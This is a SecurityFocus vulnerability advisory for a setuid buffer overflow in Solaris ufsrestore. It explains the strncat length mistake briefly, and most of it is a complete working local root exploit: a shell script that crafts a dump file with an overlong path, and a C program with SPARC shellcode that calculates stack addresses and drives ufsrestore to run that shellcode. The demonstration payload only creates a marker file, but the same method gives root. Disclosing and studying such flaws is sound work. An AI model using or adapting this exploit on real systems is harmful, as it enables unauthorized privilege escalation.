source: http://www.securityfocus.com/bid/1348/info

Solaris is a version of the UNIX Operating System distributed by Sun Microsystems.

Solaris ships with a filesystem utility called ufsrestore that is used for archive/backup retrieval. A problem with the utility could allow a local user to gain elevated privileges.

The ufsrestore utility is setuid root by default, and vulnerable to a buffer overflow attack. The problem is an oversight in code that was put in place to try and correct/prevent this very type of vulnerability. In a function in ufsrestore, two strncat calls (libc functions that are used to concatenate two NULL terminated arrays) are used to construct a string. The programmer made an effort to prevent a buffer overflow by using the strncat functions, which allow you to specify a maximum byte length. The error is that an incorrect number of bytes are passed to the strncat calls as length. The number of bytes (the maximum that the function should copy) that are passed to the strncats are the size of the entire buffer (the one being constructed), meaning it is possible to overflow it via strncat.

This problem makes it possible for a local user execute arbitrary code, and gain root priviliges. 

#!/bin/sh
#
# ufsscript
# Job de Haas
# (c) 2000 ITSX bv
#
# Utility for creating a proper dumpfile to use with the ufsroot exploit.
#
# This utility should be run as root.
# /usr/lib/fs/ufs/ufsrestore has difficulties dealing with long pathnames.
# This script creates a long path a dumps it with /usr/lib/fs/ufs/ufsdump
#

/bin/rm -f /var/tmp/dumpufs 
/bin/rm -rf /var/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
cd /var/tmp
/bin/mkdir aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
cd aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
/bin/mkdir aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
cd aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
/bin/mkdir aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
cd aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
/bin/mkdir aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
cd aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
touch a
/usr/lib/fs/ufs/ufsdump f /var/tmp/dumpufs ./a
cd /var/tmp
/bin/rm -rf /var/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
chmod a+r /var/tmp/dumpufs

----snip----

/*
 * ufsroot.c
 * Job de Haas
 * (c) ITSX bv 2000
 *
 * This program demonstrates an overflow problem in /usr/lib/fs/ufs/ufsrestore.
 * The exploit requires a file called 'dumpufs' created with the accompanying
 * 'ufsscript' in the directory /var/tmp. When successful it will execture the
 * command '/bin/touch /tmp/root_was_here'. This demonstration has only been
 * tested on sun4u Solaris 8.
 *
 * The problem is a programming error trying to fix an overflow bug.
 * The relevant code probably looks something like:
 *
 *      char output[BUFSIZ];
 *      ....
 *              (void) strncpy(output, curdir, BUFSIZ);
 *              (void) strncat(output, "/", BUFSIZ);
 *              (void) strncat(output, rawname, BUFSIZ);
 *              canon(output, name, size);
 * 
 * This assumption is based on original restore source code as can been seen in
 * http://www.FreeBSD.org/cgi/cvsweb.cgi/src/sbin/restore/interactive.c?rev=1.5
 * and dissassembly of the relevant portion of /usr/lib/fs/ufs/ufsrestore.
 *
 * I toyed a bit with some code to position the shellcode at a well defined
 * location, independent of the platform at run time. It does not work very
 * well yet. No 64 bit detection yet and often exploits still need some tuning
 * of frame pointers or registers anyway.
 *
 * cc ufsroot.c -o ufsroot
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/systeminfo.h>
#include <sys/types.h>
#include <sys/stack.h>
#include <procfs.h>
#include <fcntl.h>

#define PROG "/usr/lib/fs/ufs/ufsrestore"

#define SHELLCODE_OFFSET	60
#define FP_OFFSET		1280

char sparc_shellcode[] =
"EXPLOIT=xxxxxxxx"
"\x82\x10\x20\x17\x91\xd0\x20\x08\x9a\x03\xe0\x08\xda\x23\xbf\xf4"
"\x9a\x03\xe0\x13\xda\x23\xbf\xf8\xd0\x23\xbf\xfc\xd0\x2b\xe0\x12"
"\xd0\x03\xbf\xf4\x92\x23\xa0\x0c\x94\x23\xa0\x04\x82\x10\x20\x3b"
"\x91\xd0\x20\x08\x7f\xff\xff\xf3\x90\x1a\x40\x09\x2f\x62\x69\x6e"
"\x2f\x74\x6f\x75\x63\x68\x58\x2f\x74\x6d\x70\x2f\x72\x6f\x6f\x74"
"\x5f\x77\x61\x73\x5f\x68\x65\x72\x65\x00";

char pad1[] =
"PAD0001=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";

char pad2[] =
"PAD0002=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";


main()
{
    char *args[4], *envs[5], prog[1024], platform[1024], pathpstatus[1024];
    int argc, envc, len, len2, len3, fd, off, totlen;
    pstatus_t pstatus;
    u_long stacktop, stackstart;
    pid_t pid;
    int mypipe[2];
    FILE *fp;

    /*
     * Try to estimate the stack accurately so we are independent
     * of the platform and arch. No idea how good this all is cause
     * I have limited test plaforms.
     */

    if (sysinfo(SI_PLATFORM, platform, sizeof(platform))<0) {
        perror("sysinfo");
        exit(1);
    }

    realpath(PROG,prog);

    args[0] = strdup("ufsrestore");
    args[1] = strdup("if");
    args[2] = strdup("/var/tmp/dumpufs");
    args[3] = NULL;

    len2 = strlen(platform) + 1 + strlen(prog) + 1;
    len2 = (len2 + 3) & ~3;

    pad2[ 243 - (len2 + strlen(sparc_shellcode) + 1) ] = '\0';

    envs[0] = strdup(pad1);
    envs[1] = strdup(sparc_shellcode);
    envs[2] = strdup(pad2);
    envs[3] = NULL;

    len = 0;
    argc = 0;
    while (args[argc] != NULL)
         len += strlen(args[argc++]) + 1;

    envc=0;
    len3 = 0;
    while (envs[envc] != NULL)
         len3 += strlen(envs[envc++]) + 1;

    /*
     * Try to calculate the proper lengths and sizes. Information on
     * on this can (could) be found in /usr/include/sys/* . Still it is
     * a bit of magic. Some things changed with sol 8 too. Again padding is
     * used to create a predictable location of the shell code.
     */

    envs[0][ 255 - (len + (argc + envc + 4) * 4)] = '\0';

    /* calculate the offset of the shell code */
    off = len + (argc + envc + 3) * 4 + strlen(envs[0]) + 1 + SHELLCODE_OFFSET;

    len = ((len3 - ((argc + envc + 4) * 4) + 3) & ~3) + 4;
    len += len2;

    /* Calculate the total size of the data on the stack. SA is still arch
     * dependent (32/64bit) so this part still needs to determine the correct
     * size.
     */
    totlen = SA(len + (argc + envc + 4) * 4);

    /*
     * Get the top of the stack. Didn't know how else to get it.
     * The idea is you can compile the binary and use it on any arch.
     */

    sprintf(pathpstatus,"/proc/%d/status",getpid());

    if ((fd = open(pathpstatus, O_RDONLY)) < 0 ) {
        perror(pathpstatus);
        exit(1);
    }

    if (read(fd, &pstatus, sizeof (pstatus)) < 0 ) {
        (void) close(fd);
        perror("read");
        exit(1);
    }

    stacktop = pstatus.pr_stkbase + pstatus.pr_stksize;
    stackstart = stacktop - totlen;
    (void) close(fd);

    /* Create the pipe. */
    if (pipe (mypipe)) {
        fprintf (stderr, "Pipe failed.\n");
        return EXIT_FAILURE;
    }

    /* Create the child process. */
    pid = fork ();
    if (pid == (pid_t) 0) {
        /* This is the child process. */
        close(STDIN_FILENO);
        dup2(mypipe[0], STDIN_FILENO);
        close(STDOUT_FILENO);
        dup2(mypipe[1], STDOUT_FILENO);
        close(STDERR_FILENO);
        execve(prog, args, envs);
        return EXIT_SUCCESS;
    } else if (pid < (pid_t) 0) {
        /* The fork failed. */
        fprintf (stderr, "Fork failed.\n");
        return EXIT_FAILURE;
    } else {
        /* This is the parent process. */
        char buf[256];
        unsigned long ptr;

        /*
         * Go into interactive mode with ufsrestore and go into the
         * long path. Then give the 'x' command to force ufsrestore to
         * return outof the command loop and at the same time overflow the
         * path buffer.
         */

        fp = fdopen(mypipe[1],"w");
        fprintf(fp,"cd /var/tmp/a*/a*/a*/a*\n");fflush(fp);
        sprintf(buf,"x ../../aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
                     "aaaaaaaaaaaaaaaaaaaaaaaaaaa\n");
        ptr = stackstart - FP_OFFSET;
        *(long *)&buf[strlen(buf)-33] = ptr;
        *(long *)&buf[strlen(buf)-9]  = ptr;
        ptr = stackstart + off; 
        *(long *)&buf[strlen(buf)-5]  = ptr;
        fprintf(fp,buf);fflush(fp);
        return EXIT_SUCCESS;
    }
}